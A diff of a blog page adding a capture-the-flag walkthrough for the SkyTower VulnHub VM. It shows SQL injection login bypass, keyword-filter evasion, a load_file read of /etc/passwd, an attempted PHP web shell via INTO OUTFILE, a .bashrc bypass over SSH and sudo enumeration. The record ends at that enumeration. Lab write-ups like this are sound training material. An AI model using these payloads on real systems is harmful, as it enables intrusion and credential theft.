@@ -9,7 +9,7 @@
   <meta name="author" content="Leon Jacobs">
 
   
-  <meta name="description" content="This is not a old technique. Many a person has written about it and many technical methods are available to achieve this. Most notably, a concept of &hellip;">
+  <meta name="description" content="foreword Recently, at a local Security Conference, @telspacesystems ran a CTF. It was a classic &lsquo;read /root/flag.txt&rsquo; CTF hosted on a &hellip;">
   
 
   <!-- http://t.co/dKP3o1e -->
@@ -78,6 +78,437 @@
     <div id="content">
       <div class="blog-index">
   
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2014/07/17/climbing-the-skytower/">Climbing the SkyTower</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2014-07-17T18:20:12+02:00" pubdate data-updated="true">Jul 17<sup>th</sup>, 2014</time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><h2>foreword</h2>
+
+<p>Recently, at a local Security Conference, <a href="https://twitter.com/telspacesystems">@telspacesystems</a> ran a CTF. It was a classic &lsquo;read /root/flag.txt&rsquo; CTF hosted on a wireless network. Sadly the wifi sucked, a lot, and due to this and a flat battery I was not able to attempt this CTF properly at the con. Nonetheless, the VM was released on <a href="http://vulnhub.com/entry/skytower-1,96/">VulnHub</a>, and was promptly downloaded and loaded into VirtualBox.</p>
+
+<p>In summary, this CTF taught me some interesting things about SQL injection where filters are present. More specifically, commas were filtered out and resulted in the need from some creative thinking :)</p>
+
+<h2>starting off</h2>
+
+<p>The very first thing to do was get the IP assigned by my home router to the VM. Loaded this up into a web browser and saw the skytower web page as per the screenshots in the vulnhub entry. The IP I got was 192.168.137.242.</p>
+
+<p>The home page presented you with a login screen and a 2.5MB &lsquo;background.jpg&rsquo; image. Right in the beginning I was started off on the wrong path. I downloaded this background image and attempted to see if there was anything particularly interesting about it. Sadly, the answer to this question was a loud <em>NOPE</em>. I started dirbuster on the web interface and proceeded with a nmap scan of 192.168.137.242 after which I had to call it a night.</p>
+
+<figure class='code'><figcaption><span>SkyTower Nmap results</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>nmap --reason -Pn 192.168.137.242
+</span><span class='line'>
+</span><span class='line'>Starting Nmap 6.46 <span class="o">(</span> http://nmap.org <span class="o">)</span> at 2014-07-17 18:32 SAST
+</span><span class='line'>Nmap scan report <span class="k">for </span>192.168.137.242
+</span><span class='line'>Host is up, received user-set <span class="o">(</span>0.0020s latency<span class="o">)</span>.
+</span><span class='line'>Not shown: 997 closed ports
+</span><span class='line'>Reason: 997 conn-refused
+</span><span class='line'>PORT     STATE    SERVICE    REASON
+</span><span class='line'>22/tcp   filtered ssh        no-response
+</span><span class='line'>80/tcp   open     http       syn-ack
+</span><span class='line'>3128/tcp open     squid-http syn-ack
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Next morning I reviewed the results and continued to poke around.</p>
+
+<h2>learn all you can</h2>
+
+<p>With the information gathered so far, I realized that the SSH (tcp/22) was explicitly filtered, however the squid proxy was open. I tried to telnet and use the CONNECT method to see if I was able to access the SSH service:</p>
+
+<figure class='code'><figcaption><span>SSH Access via open proxy</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>telnet 192.168.137.242 3128
+</span><span class='line'>Trying 192.168.137.242...
+</span><span class='line'>Connected to 192.168.137.242.
+</span><span class='line'>Escape character is <span class="s1">&#39;^]&#39;</span>.
+</span><span class='line'>CONNECT 127.0.0.1:22
+</span><span class='line'>HTTP/1.0 200 Connection established
+</span><span class='line'>
+</span><span class='line'>SSH-2.0-OpenSSH_6.0p1 Debian-4+deb7u1
+</span><span class='line'>^<span class="o">]</span>
+</span><span class='line'>telnet&gt; quit
+</span><span class='line'>Connection closed.
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Great, soooo I can get access to the SSH service of needed. The dirbuster results showed nothing of particular interest, but it was worth a shot anyways. An important thing to note here is that I suspect I maxed out the disk space in the VM due to the access_log growing too big from the dirbust. This caused me numerous headaches and frustrated me quite a bit when I was testing. Anyways&hellip;</p>
+
+<p>The next step was to poke around the web application. I personally really enjoy web hacking so this was probably the most fun of the whole CTF. The web page presented you with a simple form that would POST to <code>login.php</code>. 2 fields were posted: <code>email</code> &amp; <code>password</code></p>
+
+<p>A natural reaction is to try and use a single quote in form fields as a quick and nasty check for potential SQL injection. A login attempt with a username of test and password <code>'</code> resulted in:</p>
+
+<figure class='code'><figcaption><span>SQLi Reveal</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>There was an error running the query <span class="o">[</span>You have an error in your SQL syntax<span class="p">;</span> check the manual that corresponds to your MySQL server version <span class="k">for </span>the right syntax to use near <span class="s1">&#39;&#39;&#39;&#39;</span><span class="err">&#39;</span> at line 1<span class="o">]</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Classic SQLi! Surprised I continued with simple login bypasses. None that I could think of out of my head appeared to work. Eventually I started to notice that some of the keywords that I was using were not appearing in the error messages. This hinted heavily towards the fact that there may be some form of filtering in place. Eventually, I put the request down in a curl command so that I can work with this slightly easier. To sample the keywords being removed:</p>
+
+<figure class='code'><figcaption><span>SkyTower keyword removal</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>curl --data <span class="s2">&quot;email=foo@bar&amp;password=&#39; OR 1=1#&quot;</span> http://192.168.137.242/login.php
+</span><span class='line'>There was an error running the query <span class="o">[</span>You have an error in your SQL syntax<span class="p">;</span> check the manual that corresponds to your MySQL server version <span class="k">for </span>the right syntax to use near <span class="s1">&#39;11#&#39;&#39; at line 1]%</span>
+</span><span class='line'>
+</span><span class='line'><span class="s1">$ curl --data &quot;email=foo@bar&amp;password=&#39;</span>1 OR <span class="nv">1</span><span class="o">=</span>1#<span class="err">&quot;</span> http://192.168.137.242/login.php
+</span><span class='line'>There was an error running the query <span class="o">[</span>You have an error in your SQL syntax<span class="p">;</span> check the manual that corresponds to your MySQL server version <span class="k">for </span>the right syntax to use near <span class="s1">&#39;1  11#&#39;</span><span class="err">&#39;</span> at line 1<span class="o">]</span>%
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Ok, so no <code>OR</code>. Thats ok, we can substitute this easily with <code>||</code>.</p>
+
+<figure class='code'><figcaption><span>SkyTower Auth Bypass</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+</pre></td><td class='code'><pre><code class='html'><span class='line'>$ curl --data &quot;email=foo@bar<span class="err">&amp;</span>password=&#39; || 1=1#&quot; http://192.168.137.242/login.php
+</span><span class='line'><span class="nt">&lt;HTML&gt;</span>
+</span><span class='line'>      <span class="nt">&lt;div</span> <span class="na">style=</span><span class="s">&quot;height:100%; width:100%;background-image:url(&#39;background.jpg&#39;);</span>
+</span><span class='line'><span class="s">                                background-size:100%;</span>
+</span><span class='line'><span class="s">                                background-position:50% 50%;</span>
+</span><span class='line'><span class="s">                                background-repeat:no-repeat;&quot;</span><span class="nt">&gt;</span>
+</span><span class='line'>      <span class="nt">&lt;div</span> <span class="na">style=</span><span class="s">&quot;</span>
+</span><span class='line'><span class="s">        padding-right:8px;</span>
+</span><span class='line'><span class="s">              padding-left:10px;</span>
+</span><span class='line'><span class="s">        padding-top: 10px;</span>
+</span><span class='line'><span class="s">              padding-bottom: 10px;</span>
+</span><span class='line'><span class="s">                  background-color:white;</span>
+</span><span class='line'><span class="s">                  border-color: #000000;</span>
+</span><span class='line'><span class="s">                  border-width: 5px;</span>
+</span><span class='line'><span class="s">                  border-style: solid;</span>
+</span><span class='line'><span class="s">                  width: 400px;</span>
+</span><span class='line'><span class="s">                  height:430px;</span>
+</span><span class='line'><span class="s">                  position:absolute;</span>
+</span><span class='line'><span class="s">                  top:50%;</span>
+</span><span class='line'><span class="s">                  left:50%;</span>
+</span><span class='line'><span class="s">                  margin-top:-215px; /* this is half the height of your div*/</span>
+</span><span class='line'><span class="s">                  margin-left:-200px;</span>
+</span><span class='line'><span class="s">                                &quot;</span><span class="nt">&gt;</span>
+</span><span class='line'>   <span class="nt">&lt;br&gt;&lt;strong&gt;&lt;font</span> <span class="na">size=</span><span class="s">4</span><span class="nt">&gt;</span>Welcome john@skytech.com<span class="nt">&lt;/font&gt;&lt;br</span> <span class="nt">/&gt;</span> <span class="nt">&lt;/br&gt;&lt;/strong&gt;</span>As you may know, SkyTech has ceased all international operations.<span class="nt">&lt;br&gt;&lt;br&gt;</span> To all our long term employees, we wish to convey our thanks for your dedication and hard work.<span class="nt">&lt;br&gt;&lt;br&gt;&lt;strong&gt;</span>Unfortunately, all international contracts, including yours have been terminated.<span class="nt">&lt;/strong&gt;&lt;br&gt;&lt;br&gt;</span> The remainder of your contract and retirement fund, <span class="nt">&lt;strong&gt;</span>$2<span class="nt">&lt;/strong&gt;</span> ,has been payed out in full to a secure account.  For security reasons, you must login to the SkyTech server via SSH to access the account details.<span class="nt">&lt;br&gt;&lt;br&gt;&lt;strong&gt;</span>Username: john<span class="nt">&lt;/strong&gt;&lt;br&gt;&lt;strong&gt;</span>Password: hereisjohn<span class="nt">&lt;/strong&gt;</span> <span class="nt">&lt;br&gt;&lt;br&gt;</span> We wish you the best of luck in your future endeavors. <span class="nt">&lt;br&gt;</span> <span class="nt">&lt;/div&gt;</span> <span class="nt">&lt;/div&gt;&lt;/HTML&gt;</span>%
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>And success. We have made some progress :D Little did I know that I don&rsquo;t actually completely understand the progress made yet, but just keep this in mind :)</p>
+
+<h2>climbing the tower and faling hard</h2>
+
+<p>From the auth bypass results, we can see specific mention for users to SSH into the server. This particular user has a username <code>john</code> and a password <code>hereisjohn</code>. So lets try this.
+I setup my <code>proxychains</code> install to use the http proxy available on the server (<code>http 192.168.137.242 3128</code>) and opened a SSH session through it:</p>
+
+<figure class='code'><figcaption><span>SSH via Squid Proxy</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>proxychains4 ssh john@127.0.0.1
+</span><span class='line'><span class="o">[</span>snip<span class="o">]</span>
+</span><span class='line'><span class="o">[</span>proxychains<span class="o">]</span> Strict chain  ...  192.168.137.242:3128  ...  127.0.0.1:22  ...  OK
+</span><span class='line'>john@127.0.0.1<span class="err">&#39;</span>s password:
+</span><span class='line'>Linux SkyTower 3.2.0-4-amd64 <span class="c">#1 SMP Debian 3.2.54-2 x86_64</span>
+</span><span class='line'>
+</span><span class='line'>The programs included with the Debian GNU/Linux system are free software<span class="p">;</span>
+</span><span class='line'>the exact distribution terms <span class="k">for </span>each program are described in the
+</span><span class='line'>individual files in /usr/share/doc/*/copyright.
+</span><span class='line'>
+</span><span class='line'>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+</span><span class='line'>permitted by applicable law.
+</span><span class='line'>Last login: Thu Jul 17 12:54:32 2014 from localhost
+</span><span class='line'>
+</span><span class='line'>Funds have been withdrawn
+</span><span class='line'>Connection to 127.0.0.1 closed.
+</span><span class='line'><span class="err">$</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>&hellip; ok. So we get a session, and are told <em>Funds have been withdrawn</em>, and get the connection closed. Not exactly what I hoped for. Thinking what could cause this behavior, my mind went on to things like a custom shell, <code>.bashrc</code> files (assuming the user has bash a a shell) etc. So, I figured there may be more users on the system and I should try get those credentials too. After all, we have a working SQL injection point.</p>
+
+<h2>more sql injection</h2>
+
+<p>So back to the SQLi point it was. Taking a wild guess, I assumed there is a <code>users</code> table, and the table will have a primary key of <code>id</code>. So, <code>john</code> may have id 1, and a next user have id 2. So I modified the query slightly:</p>
+
+<figure class='code'><figcaption><span>SkyTower = filter</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>curl --data <span class="s2">&quot;email=foo@bar&amp;password=&#39; || id=1#&quot;</span> http://192.168.137.242/login.php
+</span><span class='line'>There was an error running the query <span class="o">[</span>Unknown column <span class="s1">&#39;id1&#39;</span> in <span class="s1">&#39;where clause&#39;</span><span class="o">]</span>%
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Well I definitely didn&rsquo;t ask for the column <code>id1</code>, but from this again it was apparent that <code>=</code> was filtered along with <code>OR</code>. :| Ok, so we change the payload again:</p>
+
+<figure class='code'><figcaption><span>SkyTower user enum</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>curl --data <span class="s2">&quot;email=foo@bar&amp;password=&#39; || id &gt; 1#&quot;</span> http://192.168.137.242/login.php
+</span><span class='line'><span class="o">[</span>snip<span class="o">]</span>
+</span><span class='line'>&lt;br&gt;&lt;strong&gt;&lt;font <span class="nv">size</span><span class="o">=</span>4&gt;Welcome sara@skytech.com&lt;/font&gt;&lt;br /&gt; &lt;/br&gt;&lt;/strong&gt;As you may know, SkyTech has ceased all international operations.&lt;br&gt;&lt;br&gt; To all our long term employees, we wish to convey our thanks <span class="k">for </span>your dedication and hard work.&lt;br&gt;&lt;br&gt;&lt;strong&gt;Unfortunately, all international contracts, including yours have been terminated.&lt;/strong&gt;&lt;br&gt;&lt;br&gt; The remainder of your contract and retirement fund, &lt;strong&gt;<span class="nv">$2</span>&lt;/strong&gt; ,has been payed out in full to a secure account.  For security reasons, you must login to the SkyTech server via SSH to access the account details.&lt;br&gt;&lt;br&gt;&lt;strong&gt;Username: sara&lt;/strong&gt;&lt;br&gt;&lt;strong&gt;Password: ihatethisjob&lt;/strong&gt; &lt;br&gt;&lt;br&gt; We wish you the best of luck in your future endeavors. &lt;br&gt; &lt;/div&gt; &lt;/div&gt;&lt;/HTML&gt;%
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Yay, my guess on the <code>id</code> column was correct, and I now had a second users details. I continued to increment the <code>id</code>, and ended up with 3 accounts:</p>
+
+<ul>
+<li>john:hereisjohn</li>
+<li>sara:ihatethisjob</li>
+<li>william:senseable</li>
+</ul>
+
+
+<p>The users <code>john</code> &amp; <code>sara</code> both had the same behavior when attempting login via SSH, and the user <code>william</code> appears to have had an incorrect password. So, again the results were not exactly what I hoped for.</p>
+
+<h2>more SQL enumeration</h2>
+
+<p>At this stage, I was thinking there must be more information in the database, and I should try and read some files from disk in order to gain a better understanding of what is going on here.</p>
+
+<p>Fast forward a few hours, I discovered that a few more keywords and symbols were filtered. The hardest being the realization that a <code>union select</code> was not working as expected so that I can enumerate the columns. Even though the initial entry on vulnhub mentioned that automated tools would probably not work, I figured in this case that I had a valid SQLi, I could just make use of some SQLMap automagic. Again <em>NOPE</em>. Even with <code>--level 3</code> &amp; <code>--risk 3</code> there was no joy. This is ok.</p>
+
+<p>I studied the error messages in detail, googled&hellip; a lot&hellip; and eventually came across <a href="http://zoczus.blogspot.nl/2013/03/sql-injection-without-comma-char.html">this</a> blogpost, detailing a way to get a union working without the ability to use commas. I should also note that I managed to bypass the <code>SELECT</code> filter by using <code>SELECSELECTT</code> in the payload. Assuming that the filter was a simple <code>str_replace()</code>, this left me with <code>SELECT</code> after the pass.</p>
+
+<p>For the sake of brevity I am not going to detail all of the methods I used in order to exploit the SQLi and get value out of it. I managed to learn that the database user used by the PHP application was root. The query used in <code>login.php</code> returned 3 columns. One particular payload of interest that uses the method in the previously mentioned blog post, was used to start reading files from the servers disk. More specifically, <code>/etc/passwd</code>:</p>
+
+<figure class='code'><figcaption><span>SkyTower File Access</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>curl --data <span class="s2">&quot;email=foo@bar&amp;password=&#39; or union selecselectt * from (selecselectt 111) as a JOIN (selecselectt 222) as b JOIN (selecselectt load_file(&#39;/etc/password&#39;)) as c#&quot;</span> http://192.168.137.242/login.php
+</span><span class='line'><span class="o">[</span>snip<span class="o">]</span>
+</span><span class='line'>&lt;br&gt;&lt;strong&gt;&lt;font <span class="nv">size</span><span class="o">=</span>4&gt;Welcome 222&lt;/font&gt;&lt;br /&gt; &lt;/br&gt;&lt;/strong&gt;As you may know, SkyTech has ceased all international operations.&lt;br&gt;&lt;br&gt; To all our long term employees, we wish to convey our thanks <span class="k">for </span>your dedication and hard work.&lt;br&gt;&lt;br&gt;&lt;strong&gt;Unfortunately, all international contracts, including yours have been terminated.&lt;/strong&gt;&lt;br&gt;&lt;br&gt; The remainder of your contract and retirement fund, &lt;strong&gt;<span class="nv">$2</span>&lt;/strong&gt; ,has been payed out in full to a secure account.  For security reasons, you must login to the SkyTech server via SSH to access the account details.&lt;br&gt;&lt;br&gt;&lt;strong&gt;Username: 222&lt;/strong&gt;&lt;br&gt;&lt;strong&gt;Password: root:x:0:0:root:/root:/bin/bash
+</span><span class='line'>daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+</span><span class='line'>bin:x:2:2:bin:/bin:/bin/sh
+</span><span class='line'>sys:x:3:3:sys:/dev:/bin/sh
+</span><span class='line'>sync:x:4:65534:sync:/bin:/bin/sync
+</span><span class='line'>games:x:5:60:games:/usr/games:/bin/sh
+</span><span class='line'>man:x:6:12:man:/var/cache/man:/bin/sh
+</span><span class='line'>lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+</span><span class='line'>mail:x:8:8:mail:/var/mail:/bin/sh
+</span><span class='line'>news:x:9:9:news:/var/spool/news:/bin/sh
+</span><span class='line'>uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+</span><span class='line'>proxy:x:13:13:proxy:/bin:/bin/sh
+</span><span class='line'>www-data:x:33:33:www-data:/var/www:/bin/sh
+</span><span class='line'>backup:x:34:34:backup:/var/backups:/bin/sh
+</span><span class='line'>list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+</span><span class='line'>irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+</span><span class='line'>gnats:x:41:41:Gnats Bug-Reporting System <span class="o">(</span>admin<span class="o">)</span>:/var/lib/gnats:/bin/sh
+</span><span class='line'>nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+</span><span class='line'>libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+</span><span class='line'>sshd:x:101:65534::/var/run/sshd:/usr/sbin/nologin
+</span><span class='line'>mysql:x:102:105:MySQL Server,,,:/nonexistent:/bin/false
+</span><span class='line'>john:x:1000:1000:john,,,:/home/john:/bin/bash
+</span><span class='line'>sara:x:1001:1001:,,,:/home/sara:/bin/bash
+</span><span class='line'>william:x:1002:1002:,,,:/home/william:/bin/bash
+</span><span class='line'>&lt;/strong&gt; &lt;br&gt;&lt;br&gt; We wish you the best of luck in your future endeavors. &lt;br&gt; &lt;/div&gt; &lt;/div&gt;&lt;/HTML&gt;
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Reading the <code>/etc/passwd</code> revealed that there were no custom shells used for the users that were enumerated previously. O..k.. I also pulled the sources of <code>login.php</code> in order to understand what the deal with the filtering was:</p>
+
+<figure class='code'><figcaption><span>SkyTower SQL Injection Filtering</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="nv">$sqlinjection</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;SELECT&quot;</span><span class="p">,</span> <span class="s2">&quot;TRUE&quot;</span><span class="p">,</span> <span class="s2">&quot;FALSE&quot;</span><span class="p">,</span> <span class="s2">&quot;--&quot;</span><span class="p">,</span><span class="s2">&quot;OR&quot;</span><span class="p">,</span> <span class="s2">&quot;=&quot;</span><span class="p">,</span> <span class="s2">&quot;,&quot;</span><span class="p">,</span> <span class="s2">&quot;AND&quot;</span><span class="p">,</span> <span class="s2">&quot;NOT&quot;</span><span class="p">);</span>
+</span><span class='line'><span class="nv">$email</span> <span class="o">=</span> <span class="nb">str_ireplace</span><span class="p">(</span><span class="nv">$sqlinjection</span><span class="p">,</span> <span class="s2">&quot;&quot;</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;email&#39;</span><span class="p">]);</span>
+</span><span class='line'><span class="nv">$password</span> <span class="o">=</span> <span class="nb">str_ireplace</span><span class="p">(</span><span class="nv">$sqlinjection</span><span class="p">,</span> <span class="s2">&quot;&quot;</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">]);</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>And as suspected. :)</p>
+
+<p>One last thing that I tried, really hard, was to get a web shell on the server so that I can further explore the environment. This failed miserably. The closest I was able to get was:</p>
+
+<figure class='code'><figcaption><span>SkyTower webshell fail</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>curl --data <span class="s2">&quot;email=foo@bar&amp;password=&#39; or union selecselectt * from (selecselectt 111) as a JOIN (selecselectt 222) as b JOIN (selecselectt &#39;&lt;?php print_r(shell_exec($_GET[cmd])); ?&gt;&#39;) as c into outfile &#39;/var/www/shell.php&#39;#&quot;</span> http://192.168.137.242/login.php
+</span><span class='line'>There was an error running the query <span class="o">[</span>Can<span class="s1">&#39;t create/write to file &#39;</span>/var/www/shell.php<span class="err">&#39;</span> <span class="o">(</span>Errcode: 13<span class="o">)]</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>This obviously alludes to the fact that the user MySQL is running as des not have access to write to the web folder. It was time to rethink what was going on here&hellip;
+Oh yes, I obviously tried to just cat <code>/root/flag.txt</code>, but didn’t expect it to be <em>that</em> easy :D</p>
+
+<h2>gaining further access</h2>
+
+<p>After spending a really long time with the SQL injections, I decided to relook the SSH section. From the SQL injection that I learnt that there don&rsquo;t <em>appear</em> to be any custom shells in use, so the other thing this could be is a <code>.bashrc</code> with a <code>exit</code> command. I know its <code>.bashrc</code> because I saw the shell is <code>/bin/bash</code> from the <code>/etc/passwd</code>. I remember that I make heavy use of <code>ssh -t</code> to execute commands on the remove server, usually to setup multiple tunnels into a network, so I thought it will come in handy here.</p>
+
+<p>For this case though, I though I&rsquo;d specify a <code>/bin/sh</code> as the <em>command</em> to run, hoping to not get caught in a <code>.bashrc</code> running:</p>
+
+<figure class='code'><figcaption><span>SkyTower .bashrc fix</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>proxychains4 -q ssh john@127.0.0.1 -t /bin/sh
+</span><span class='line'>john@127.0.0.1<span class="err">&#39;</span>s password:
+</span><span class='line'><span class="nv">$ </span>id
+</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>john<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>john<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>john<span class="o">)</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Woop! I was now logged in as <code>john</code>. I inspected the <code>.bashrc</code> file and saw that at the end there was:</p>
+
+<figure class='code'><figcaption><span>SkyTower .bashrc exit</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nb">echo</span>
+</span><span class='line'><span class="nb">echo</span>  <span class="s2">&quot;Funds have been withdrawn&quot;</span>
+</span><span class='line'><span class="nb">exit</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>&hellip; a exit. I simply removed the line. Now the almost obvious next step was to inspect and enumerate as much as possible. The most obvious thing that came to mind was privilege escalation as I was simply a normal user on the system at the moment.</p>
+
+<h2>enumeration enumeration enumeration</h2>
+
+<p>I enumerated, everything&hellip; Referring to a excellent <a href="http://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">post by g0tm1lk</a> nothing aparent came up. The only semi strange thing was a empty <code>/accounts/</code> directory:</p>
+
+<figure class='code'><figcaption><span>SkyTower accounts</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>john@SkyTower:/accounts<span class="nv">$ </span>ls -lah /accounts/
+</span><span class='line'>total 8.0K
+</span><span class='line'>drwxr-xr-x  2 root root 4.0K Jun 20 07:52 .
+</span><span class='line'>drwxr-xr-x 24 root root 4.0K Jun 20 07:52 ..
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Other than that things seemed pretty normal. I decided to check out the other user <code>sara</code> too. This user has a similar <code>exit</code> in the <code>.bashrc</code> which I just removed. There was one distinct difference during enumeration though&hellip;</p>
+
+<figure class='code'><figcaption><span>sara sudo</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>sara@SkyTower:~<span class="nv">$ </span>sudo -l
+</span><span class='line'>Matching Defaults entries <span class="k">for </span>sara on this host:
+</span><span class='line'>    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin
+</span><span class='line'>
+</span><span class='line'>User sara may run the following commands on this host:
+</span><span class='line'>    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /bin/cat /accounts/*, <span class="o">(</span>root<span class="o">)</span> /bin/ls /accounts/*
+</span></code></pre></td></tr></table></div></figure>
+
+
